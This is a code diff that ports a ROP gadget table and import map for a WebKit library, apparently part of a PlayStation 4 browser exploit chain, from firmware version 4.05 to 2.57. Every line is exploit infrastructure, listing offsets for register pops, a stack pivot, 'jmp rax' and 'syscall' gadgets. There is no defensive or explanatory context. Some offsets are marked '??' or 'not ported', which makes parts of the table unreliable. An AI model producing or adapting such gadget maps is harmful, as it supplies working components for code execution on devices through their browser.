@@ -7,10 +7,10 @@ var generateBasicImportMap = function()
 {
   window.basicImportMap =
   {
-    '4.05':
+    '2.57':
     {
-      'setjmp':            getGadget('libSceWebKit2', 0x270),     // setjmp imported from libkernel
-      '__stack_chk_fail': getGadget('libSceWebKit2', 0x2728DF8),
+      'setjmp':            getGadget('libSceWebKit2', 0x2C8),     // setjmp imported from libkernel, ported
+      '__stack_chk_fail': getGadget('libSceWebKit2', 0x277CF70),//ported
     }
   };
 }
@@ -20,35 +20,35 @@ var generateGadgetMap = function()
 {
   window.gadgetMap =
   {
-    '4.05':
+    '2.57':
     {
-      'pop rsi':  getGadget('libSceWebKit2', 0xA459E),
-      'pop rdi':  getGadget('libSceWebKit2', 0x10F1C1),
-      'pop rax':  getGadget('libSceWebKit2', 0x1D70B),
-      'pop rcx':  getGadget('libSceWebKit2', 0x1FCA9B),
-      'pop rdx':  getGadget('libSceWebKit2', 0xD6660),
-      'pop r8':   getGadget('libSceWebKit2', 0x4A3B0D),
-      'pop r9':   getGadget('libSceWebKit2', 0xEB5F8F),
-      'pop rsp':  getGadget('libSceWebKit2', 0x20AEB0),
+      'pop rsi':  getGadget('libSceWebKit2', 0x1EC10E),//
+      'pop rdi':  getGadget('libSceWebKit2', 0x89064),//
+      'pop rax':  getGadget('libSceWebKit2', 0x10FFB),//
+      'pop rcx':  getGadget('libSceWebKit2', 0x3779D0),//
+      'pop rdx':  getGadget('libSceWebKit2', 0x171A),//
+      'pop r8':   getGadget('libSceWebKit2', 0x32750D),//
+      'pop r9':   getGadget('libSceWebKit2', 0x1383EEF),//
+      'pop rsp':  getGadget('libSceWebKit2', 0x487F0),//
 
-      'push rax': getGadget('libSceWebKit2', 0x126EFC),
+      'push rax': getGadget('libSceWebKit2', 0x10A382),//
 
-      'add rax, rcx': getGadget('libSceWebKit2', 0x86F06),
+      'add rax, rcx': getGadget('libSceWebKit2', 0x5DBD6),//
 
-      'mov rax, rdi':             getGadget('libSceWebKit2', 0x5863),
-      'mov qword ptr [rdi], rax': getGadget('libSceWebKit2', 0x11ADD7),
-      'mov qword ptr [rdi], rsi': getGadget('libSceWebKit2', 0x43CF70),
+      'mov rax, rdi':             getGadget('libSceWebKit2', 0x3233),//
+      'mov qword ptr [rdi], rax': getGadget('libSceWebKit2', 0xDE554),//
+      'mov qword ptr [rdi], rsi': getGadget('libSceWebKit2', 0x2D6090),//
 
-      'mov rax, qword ptr [rax]': getGadget('libSceWebKit2', 0xFD88D),
+      'mov rax, qword ptr [rax]': getGadget('libSceWebKit2', 0x3C9C2),//
 
-      'jmp addr': getGadget('libSceWebKit2', 0x852624),
+      'jmp addr': getGadget('libSceWebKit2', 0x116CBB4),//
 
-      'infloop': getGadget('libSceWebKit2', 0x45A11),
-      'jmp rax': getGadget('libSceWebKit2', 0x1CA2B9),
-      'push rax; jmp rcx': getGadget('libSceWebKit2', 0x469B80),
+      'infloop': getGadget('libSceWebKit2', 0x52A80),//??
+      'jmp rax': getGadget('libSceWebKit2', 0x11D329),//
+      'push rax; jmp rcx': getGadget('libSceWebKit2', 0x469B80),//not ported
 
-      'ret': getGadget('libSceWebKit2', 0xC8),
-      'syscall': getGadget('libSceWebKit2', 0x1C69388),
+      'ret': getGadget('libSceWebKit2', 0xC7),//
+      'syscall': getGadget('libSceWebKit2', 0x1C96AE8),//
     }
   };
 }
